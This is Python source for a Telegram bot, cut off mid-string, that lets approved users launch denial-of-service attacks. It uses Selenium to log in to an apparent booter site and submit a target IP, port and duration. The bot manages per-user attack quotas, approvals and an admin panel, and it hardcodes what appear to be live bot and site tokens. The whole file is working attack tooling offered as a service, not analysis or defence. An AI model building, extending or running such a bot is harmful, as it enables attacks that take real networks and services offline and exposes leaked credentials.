import os
import json
import logging
import threading
import time
import random
import string
import requests
from datetime import datetime, timedelta
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import asyncio

# ==================== CONFIGURATION ====================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8546917231:AAH12SjiIw3Yk6zCKdE2s0Vc9QNrRfRhXpk"  # Apna token daalein
ADMIN_IDS = [7820814565]  # Admin IDs
WEBSITE_URL = "https://satellitestress.st/attack"
LOGIN_URL = "https://satellitestress.st/login"
WEBSITE_TOKEN = "622de40ac2335a06b834fad06a24c42dcfdc7423b93d35a5add017c08c10db37"  # Aapka token

# ==================== DATA FILES ====================
USERS_FILE = "users.json"
ATTACKS_FILE = "attacks.json"
SETTINGS_FILE = "settings.json"

# ==================== DATA LOAD/SAVE FUNCTIONS ====================
def load_data():
    """Load all data from files"""
    default_settings = {
        "cooldown": 40,
        "default_attacks": 1,
        "maintenance_mode": False,
        "max_duration": 300,
        "admin_unlimited": True
    }
    
    try:
        with open(USERS_FILE, 'r') as f:
            users = json.load(f)
    except:
        users = {
            "approved": {},
            "admins": ADMIN_IDS,
            "banned": [],
            "pending": []
        }
        save_users(users)
    
    try:
        with open(ATTACKS_FILE, 'r') as f:
            attacks = json.load(f)
    except:
        attacks = {"current": None, "history": []}
    
    try:
        with open(SETTINGS_FILE, 'r') as f:
            settings = json.load(f)
    except:
        settings = default_settings
        save_settings(settings)
    
    return users, attacks, settings

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def save_attacks(attacks):
    with open(ATTACKS_FILE, 'w') as f:
        json.dump(attacks, f, indent=2)

def save_settings(settings):
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(settings, f, indent=2)

# Load all data
users, attacks, settings = load_data()

# ==================== HELPER FUNCTIONS ====================
def is_admin(user_id):
    return user_id in users.get("admins", [])

def is_approved(user_id):
    return str(user_id) in users.get("approved", {})

def get_user_data(user_id):
    return users.get("approved", {}).get(str(user_id), {})

def can_attack(user_id):
    if settings.get("maintenance_mode", False) and not is_admin(user_id):
        return False, "🔧 Maintenance mode is ON. Please wait."
    
    if is_admin(user_id):
        return True, "Admin - Unlimited attacks"
    
    if not is_approved(user_id):
        return False, "🚫 You are not authorized. Contact admin."
    
    user_data = get_user_data(user_id)
    attacks_allowed = user_data.get("attacks_allowed", settings.get("default_attacks", 1))
    attacks_used = user_data.get("attacks_used", 0)
    
    if attacks_used >= attacks_allowed:
        return False, f"❌ You've used all {attacks_allowed} attacks. Contact admin for more."
    
    return True, f"✅ You have {attacks_allowed - attacks_used} attacks left"

def increment_attack_count(user_id):
    if is_admin(user_id):
        return
    
    user_id_str = str(user_id)
    if user_id_str in users["approved"]:
        users["approved"][user_id_str]["attacks_used"] = users["approved"][user_id_str].get("attacks_used", 0) + 1
        save_users(users)

def reset_user_attacks(user_id):
    user_id_str = str(user_id)
    if user_id_str in users["approved"]:
        users["approved"][user_id_str]["attacks_used"] = 0
        save_users(users)

def increase_user_attacks(user_id, additional_attacks):
    user_id_str = str(user_id)
    if user_id_str in users["approved"]:
        current = users["approved"][user_id_str].get("attacks_allowed", settings.get("default_attacks", 1))
        users["approved"][user_id_str]["attacks_allowed"] = current + additional_attacks
        save_users(users)
        return True
    return False

def is_valid_ip(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        try:
            num = int(part)
            if num < 0 or num > 255:
                return False
        except:
            return False
    return True

def is_valid_port(port):
    try:
        p = int(port)
        return 1 <= p <= 65535
    except:
        return False

# ==================== CAPTCHA HANDLING ====================
def login_to_website(driver, token, captcha_text=None):
    """Login to website with token and optional CAPTCHA"""
    try:
        logger.info("Attempting to login...")
        driver.get(LOGIN_URL)
        
        wait = WebDriverWait(driver, 10)
        
        # Find token field
        token_field = wait.until(EC.presence_of_element_located((By.NAME, "token")))
        token_field.clear()
        token_field.send_keys(token)
        
        # Check for CAPTCHA
        try:
            captcha_field = driver.find_element(By.NAME, "captcha")
            if captcha_text:
                captcha_field.send_keys(captcha_text)
            else:
                return False, "CAPTCHA_REQUIRED"
        except:
            pass
        
        # Click login
        login_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Login')]")
        login_button.click()
        
        time.sleep(3)
        
        if "attack" in driver.current_url or "dashboard" in driver.current_url:
            logger.info("Login successful!")
            return True, "SUCCESS"
        else:
            return False, "LOGIN_FAILED"
            
    except Exception as e:
        logger.error(f"Login error: {e}")
        return False, str(e)

# ==================== SELENIUM ATTACK FUNCTION ====================
def launch_website_attack(ip, port, duration, captcha_text=None):
    """Launch attack using Selenium"""
    driver = None
    try:
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)
        
        # Login first
        login_success, login_result = login_to_website(driver, WEBSITE_TOKEN, captcha_text)
        
        if login_result == "CAPTCHA_REQUIRED":
            return False, "CAPTCHA", "Please enter the CAPTCHA text"
        
        if not login_success:
            return False, "LOGIN_FAILED", "Login failed. Check token."
        
        # Go to attack page
        driver.get(WEBSITE_URL)
        
        wait = WebDriverWait(driver, 10)
        
        # Fill form
        ip_field = wait.until(EC.presence_of_element_located((By.NAME, "ip")))
        ip_field.clear()
        ip_field.send_keys(ip)
        
        port_field = driver.find_element(By.NAME, "port")
        port_field.clear()
        port_field.send_keys(str(port))
        
        duration_field = driver.find_element(By.NAME, "duration")
        duration_field.clear()
        duration_field.send_keys(str(duration))
        
        # Click launch
        launch_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Launch')]")
        launch_button.click()
        
        logger.info(f"✅ Attack launched: {ip}:{port} for {duration}s")
        time.sleep(3)
        
        return True, "SUCCESS", "Attack launched successfully!"
        
    except Exception as e:
        logger.error(f"❌ Attack failed: {e}")
        return False, "ERROR", str(e)
    finally:
        if driver:
            driver.quit()

# ==================== TELEGRAM BOT HANDLERS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or f"user_{user_id}"
    
    if user_id in users.get("banned", []):
        await update.message.reply_text("🚫 You are banned.")
        return
    
    if user_id in users.get("pending", []):
        await update.message.reply_text(
            f"⏳ **PENDING APPROVAL**\n\nYour ID: `{user_id}`"
        )
        return
    
    can_attack_status, message = can_attack(user_id)
    
    keyboard = []
    if can_attack_status or is_admin(user_id):
        keyboard.append([KeyboardButton("🎯 Launch Attack"), KeyboardButton("📊 Status")])
        keyboard.append([KeyboardButton("🔐 My Stats"), KeyboardButton("❓ Help")])
    
    if is_admin(user_id):
        keyboard.append([KeyboardButton("⚙️ Admin Panel")])
    
    if not is_approved(user_id) and not is_admin(user_id):
        keyboard.append([KeyboardButton("📝 Request Access")])
    
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        f"🤖 **WELCOME**\n\n👤 @{username}\n🆔 `{user_id}`\n\n{message}",
        reply_markup=reply_markup
    )

async def request_access(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or f"user_{user_id}"
    
    if user_id not in users.get("pending", []):
        users["pending"].append(user_id)
        save_users(users)
        
        for admin_id in users["admins"]:
            try:
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=f"📝 **NEW REQUEST**\n\n@{username}\n`{user_id}`"
                )
            except:
                pass
        
        await update.message.reply_text("✅ Request sent!")
    else:
        await update.message.reply_text("⏳ Already pending.")

async def attack_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    can_attack_status, message = can_attack(user_id)
    if not can_attack_status:
        await update.message.reply_text(message)
        return
    
    if attacks.get("current") is not None:
        await update.message.reply_text("⚠️ Attack already running.")
        return
    
    context.user_data["attack_step"] = "waiting_for_ip"
    keyboard = [[KeyboardButton("❌ Cancel")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "🎯 **LAUNCH ATTACK**\n\nStep 1/3: Send IP\nExample: `1.1.1.1`",
        reply_markup=reply_markup
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if text == "❌ Cancel":
        context.user_data.clear()
        await start(update, context)
        return
    
    # Main menu buttons
    if text == "🎯 Launch Attack":
        await attack_start(update, context)
        return
    
    elif text == "📊 Status":
        if attacks.get("current"):
            a = attacks["current"]
            await update.message.reply_text(f"🔥 **RUNNING**\n`{a['ip']}:{a['port']}`\n{a['duration']}s")
        else:
            await update.message.reply_text("✅ Ready!")
        return
    
    elif text == "🔐 My Stats":
        if is_admin(user_id):
            msg = "📊 **ADMIN**\nUnlimited"
        elif is_approved(user_id):
            data = get_user_data(user_id)
            msg = f"📊 **STATS**\nUsed: {data.get('attacks_used',0)}/{data.get('attacks_allowed',1)}"
        else:
            msg = "📊 No access"
        await update.message.reply_text(msg)
        return
    
    elif text == "📝 Request Access":
        await request_access(update, context)
        return
    
    elif text == "❓ Help":
        await update.message.reply_text("🆘 **HELP**\n\nContact admin for access.")
        return
    
    elif text == "⚙️ Admin Panel" and is_admin(user_id):
        keyboard = [
            [KeyboardButton("👥 Approve"), KeyboardButton("➕ Add Attacks")],
            [KeyboardButton("📋 Users"), KeyboardButton("🔄 Reset")],
            [KeyboardButton("« Back")]
        ]
        await update.message.reply_text("⚙️ **ADMIN**", reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True))
        return
    
    elif text == "👥 Approve" and is_admin(user_id):
        if not users["pending"]:
            await update.message.reply_text("📭 No pending users.")
            return
        msg = "**PENDING:**\n"
        for uid in users["pending"][:10]:
            msg += f"`{uid}`\n"
        msg += "\nSend ID to approve:"
        context.user_data["admin_action"] = "approve"
        await update.message.reply_text(msg)
        return
    
    elif text == "➕ Add Attacks" and is_admin(user_id):
        context.user_data["admin_action"] = "add_id"
        await update.message.reply_text("Send User ID:")
        return
    
    elif text == "📋 Users" and is_admin(user_id):
        if not users["approved"]:
            await update.message.reply_text("📭 No users.")
            return
        msg = "**USERS:**\n"
        for uid, data in list(users["approved"].items())[:10]:
            msg += f"`{uid}`: {data.get('attacks_used',0)}/{data.get('attacks_allowed',1)}\n"
        await update.message.reply_text(msg)
        return
    
    elif text == "🔄 Reset" and is_admin(user_id):
        context.user_data["admin_action"] = "reset_id"
        await update.message.reply_text("Send User ID to reset:")
        return
    
    elif text == "« Back":
        await start(update, context)
        return
    
    # Admin actions
    if "admin_action" in context.user_data:
        action = context.user_data["admin_action"]
        
        if action == "approve":
            try:
                target = int(text)
                if target in users["pending"]:
                    users["pending"].remove(target)
                    users["approved"][str(target)] = {
                        "username": f"user_{target}",
                        "attacks_allowed": settings["default_attacks"],
                        "attacks_used": 0
                    }
                    save_users(users)
                    await update.message.reply_text(f"✅ Approved `{target}`")
                    try:
                        await context.bot.send_message(target, "✅ **APPROVED!** You can now attack.")
                    except:
                        pass
                else:
                    await update.message.reply_text("❌ Not found")
            except:
                await update.message.reply_text("❌ Invalid ID")
            context.user_data.pop("admin_action")
            return
        
        elif action == "add_id":
            try:
                context.user_data["add_target"] = int(text)
                context.user_data["admin_action"] = "add_count"
                await update.message.reply_text("How many attacks to add?")
            except:
                await update.message.reply_text("❌ Invalid ID")
            return
        
        elif action == "add_count":
            try:
                count = int(text)
                target = context.user_data["add_target"]
                if increase_user_attacks(target, count):
                    await update.message.reply_text(f"✅ Added {count} to `{target}`")
                    try:
                        await context.bot.send_message(target, f"🎯 +{count} attacks added!")
                    except:
                        pass
                else:
                    await update.message.reply_text("❌ User not found")
            except:
                await update.message.reply_text("❌ Invalid number")
            context.user_data.pop("admin_action")
            context.user_data.pop("add_target", None)
            return
        
        elif action == "reset_id":
            try:
                target = int(text)
                reset_user_attacks(target)
                await update.message.reply_text(f"✅ Reset `{target}`")
                try:
                    await context.bot.send_message(target, "🔄 Your attacks have been reset!")
                except:
                    pass
            except:
                await update.message.reply_text("❌ Invalid ID")
            context.user_data.pop("admin_action")
            return
    
    # Attack steps
    if "attack_step" in context.user_data:
        step = context.user_data["attack_step"]
        
        if step == "waiting_for_ip":
            if is_valid_ip(text):
                context.user_data["attack_ip"] = text
                context.user_data["attack_step"] = "waiting_for_port"
                await update.message.reply_text("✅ IP saved\n\nStep 2/3: Send port\nExample: `80`")
            else:
                await update.message.reply_text("❌ Invalid IP")
        
        elif step == "waiting_for_port":
            if is_valid_port(text):
                port = int(text)
                context.user_data["attack_port"] = port
                context.user_data["attack_step"] = "waiting_for_duration"
                
                keyboard = [
                    [InlineKeyboardButton("30s", callback_data="dur_30"),
                     InlineKeyboardButton("60s", callback_data="dur_60"),
                     InlineKeyboardButton("120s", callback_data="dur_120")],
                    [InlineKeyboardButton("180s", callback_data="dur_180"),
                     InlineKeyboardButton("240s", callback_data="dur_240"),
                     InlineKeyboardButton("300s", callback_data="dur_300")],
                    [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
                ]
                await update.message.reply_text(
                    f"✅ IP: `{context.user_data['attack_ip']}`\n✅ Port: `{port}`\n\nStep 3/3: Select duration:",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            else:
                await update.message.reply_text("❌ Invalid port (1-65535)")

# ==================== FIXED CALLBACK HANDLER ====================
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if query.data == "cancel":
        context.user_data.clear()
        await query.message.delete()
        await start(update, context)
        return
    
    if query.data.startswith("dur_"):
        duration = int(query.data.split("_")[1])
        
        if "attack_ip" not in context.user_data or "attack_port" not in context.user_data:
            await query.message.edit_text("❌ Session expired. Start again.")
            return
        
        ip = context.user_data["attack_ip"]
        port = context.user_data["attack_port"]
        
        # Clear user data
        context.user_data.clear()
        
        # Check if can attack
        can_attack_status, message = can_attack(user_id)
        if not can_attack_status:
            await query.message.edit_text(message)
            return
        
        # Set current attack
        attacks["current"] = {
            "ip": ip,
            "port": port,
            "duration": duration,
            "start_time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "user_id": user_id
        }
        save_attacks(attacks)
        
        await query.message.edit_text(
            f"🔄 **LAUNCHING...**\